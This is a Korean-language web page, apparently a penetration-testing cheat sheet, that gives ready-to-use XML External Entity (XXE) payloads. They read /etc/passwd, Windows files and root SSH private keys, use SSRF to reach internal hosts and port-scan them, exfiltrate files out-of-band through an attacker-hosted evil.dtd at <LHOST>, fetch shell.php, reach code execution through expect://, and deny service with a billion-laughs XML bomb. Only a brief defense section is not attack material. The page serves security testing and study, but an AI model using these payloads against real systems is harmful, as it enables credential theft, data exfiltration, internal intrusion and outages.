---
sidebar_position: 7
---

# XML External Entity (XXE)

## 기본 페이로드

### /etc/passwd 읽기

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck>
    <productId>&passwd;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Windows 파일 읽기

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
    <quantity>3</quantity>
    <item>&test;</item>
    <address>17th Estate, CA</address>
</order>
```

### SSH 키 읽기

```
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

## HTTP 요청 예제

```http
POST / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

## 파일 읽기

```xml
<!-- Linux -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!-- Windows -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>

<!-- PHP Wrapper -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

## SSRF via XXE

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin"> ]>

<!-- 포트 스캔 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80"> ]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22"> ]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:3306"> ]>
```

## Blind XXE

### Out-of-Band Data Exfiltration

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<LHOST>/evil.dtd">
  %xxe;
]>
```

**evil.dtd 내용:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?data=%file;'>">
%eval;
%exfiltrate;
```

### Error-Based XXE

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

## 파라미터 엔티티

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<LHOST>/evil.dtd">
  %xxe;
  %param1;
]>
<foo>&exfil;</foo>
```

## XXE to RCE

### expect:// (PHP)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
```

**php.ini 설정 필요:**
```ini
extension=expect.so
```

## XML Bomb (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<lolz>&lol6;</lolz>
```

## Content-Type

XXE는 다음 Content-Type에서 가능:

```
application/xml
text/xml
application/soap+xml
application/xhtml+xml
application/rss+xml
application/atom+xml
image/svg+xml
```

## XXE via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## XXE via DOCX

DOCX 파일은 ZIP 아카이브이며 XML 파일 포함:

1. DOCX 압축 해제
2. `word/document.xml` 수정
3. XXE 페이로드 삽입
4. 다시 압축

## 방어 방법

```xml
<!-- PHP -->
libxml_disable_entity_loader(true);

<!-- Java -->
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

<!-- .NET -->
settings.DtdProcessing = DtdProcessing.Prohibit;
```

## 참고

- XXE는 XML 파서가 외부 엔티티를 처리할 때 발생
- 파일 읽기, SSRF, RCE 가능
- Blind XXE는 Out-of-Band 기법 사용
- SVG, DOCX, XLSX 등에서도 XXE 가능
- Content-Type을 XML로 변경해서 테스트
- DTD (Document Type Definition) 사용
